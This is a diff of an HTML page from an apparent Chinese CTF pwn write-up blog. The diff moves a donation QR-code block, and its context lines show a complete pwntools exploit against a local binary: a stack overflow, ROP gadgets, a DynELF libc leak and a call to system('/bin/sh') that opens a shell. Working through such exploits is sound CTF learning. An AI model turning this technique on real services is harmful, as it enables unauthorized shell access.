@@ -493,6 +493,30 @@
 <p>附上完整exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">"./pwn"</span>)</div><div class="line">elf = ELF(<span class="string">"./pwn"</span>)</div><div class="line">offset = <span class="number">88</span></div><div class="line">bss_addr = elf.bss()</div><div class="line">start_addr = elf.symbols[<span class="string">'_start'</span>]</div><div class="line">pop_rdi_ret_addr = <span class="number">0x0000000000400623</span></div><div class="line">pop_rsi_pop_r15_addr = <span class="number">0x0000000000400621</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></div><div class="line">	log.info(<span class="string">'leak address =&gt; &#123;&#125; '</span>.format(hex(address)))</div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(pop_rdi_ret_addr)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">	payload += p64(address)</div><div class="line">	payload += p64(<span class="number">1</span>)</div><div class="line">	payload += p64(elf.plt[<span class="string">'write'</span>])</div><div class="line">	payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	address = p.recv(<span class="number">8</span>)</div><div class="line">	p.recv()</div><div class="line"></div><div class="line">	payload = <span class="string">'a'</span> * offset</div><div class="line">	payload += p64(start_addr)</div><div class="line">	p.send(payload)</div><div class="line">	p.recv(<span class="number">0x100</span>)</div><div class="line">	<span class="keyword">return</span> address</div><div class="line"></div><div class="line">d = DynELF(leak, elf = ELF(<span class="string">'./pwn'</span>))</div><div class="line">system_addr = d.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</div><div class="line">read_addr = d.lookup(<span class="string">"read"</span>,<span class="string">"libc"</span>)</div><div class="line"><span class="comment"># read_addr = elf.plt['read']</span></div><div class="line">log.success(<span class="string">"system address =&gt; &#123;&#125;"</span>.format(hex(system_addr)))</div><div class="line">log.success(<span class="string">"read address =&gt; &#123;&#125;"</span>.format(hex(read_addr)))</div><div class="line"></div><div class="line">payload = <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(<span class="number">0</span>)</div><div class="line">payload += p64(pop_rsi_pop_r15_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(<span class="number">1</span>)</div><div class="line">payload += p64(read_addr)</div><div class="line">payload += p64(elf.symbols[<span class="string">'func'</span>])</div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line"></div><div class="line">payload = <span class="string">'/bin/sh\x00'</span></div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">payload =  <span class="string">'a'</span> * offset</div><div class="line">payload += p64(pop_rdi_ret_addr)</div><div class="line">payload += p64(bss_addr)</div><div class="line">payload += p64(system_addr)</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">p.recv(<span class="number">0x100</span>)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
 
       
+  </div>
+      <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
+    <div id="QR" style="display: block;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/wechat.png" alt="chybeta WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/alipay.jpg?raw=true" alt="chybeta Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
     </div>
 	<div>
       
@@ -537,30 +561,7 @@
       
     </div>
 
-    <div>
-      
-        
-  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
-    <div>点击赞赏二维码，您的支持将鼓励我继续创作！</div>
-    <div id="QR" style="display: block;">
-      
-        <div id="wechat" style="display: inline-block">
-          <img id="wechat_qr" src="https://raw.githubusercontent.com/CHYbeta/chybeta.github.io/master/images/wechat.png" alt="chybeta WeChat Pay"/>
-          <p>微信打赏</p>
-        </div>
-      
-      
-        <div id="alipay" style="display: inline-block">
-          <img id="alipay_qr" src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/alipay.jpg?raw=true" alt="chybeta Alipay"/>
-          <p>支付宝打赏</p>
-        </div>
-      
-    </div>
-  </div>
 
-
-      
-    </div>
 
 
     <footer class="post-footer">
